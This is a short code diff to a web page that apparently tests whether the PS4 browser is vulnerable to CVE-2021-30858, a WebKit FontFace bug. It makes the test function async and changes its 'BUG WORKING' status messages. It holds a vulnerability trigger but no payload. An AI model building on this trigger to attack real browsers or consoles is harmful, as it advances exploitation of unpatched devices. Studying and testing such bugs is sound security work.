@@ -18,7 +18,7 @@
             }
         }
 
-         function testwebkit2() {
+         async function testwebkit2() {
             try{
             alert("Testing CVE-2021-30858 on PS4 Browser.. Rev3.\n If you receive 'there's no enought memory error msgs' means the Bug is patched.");
             let font = new FontFace("font1", '', {},ConfirmWork1());
@@ -37,13 +37,13 @@
 
             function ConfirmWork1() {
             
-            document.getElementById("test").innerHTML = "FaceFont()..OK.BUG WORKING!!!";
+            document.getElementById("test").innerHTML = "Proccess --> FaceFont()..BUG WORKING!!!";
 
             }
 
             function ConfirmWork2() {
             
-            document.getElementById("test").innerHTML = "FaceFontSet()..OK.BUG WORKING!!!";
+            document.getElementById("test").innerHTML = "Proccess --> FaceFontSet()..BUG NO WORKING!!!";
 
             }
 
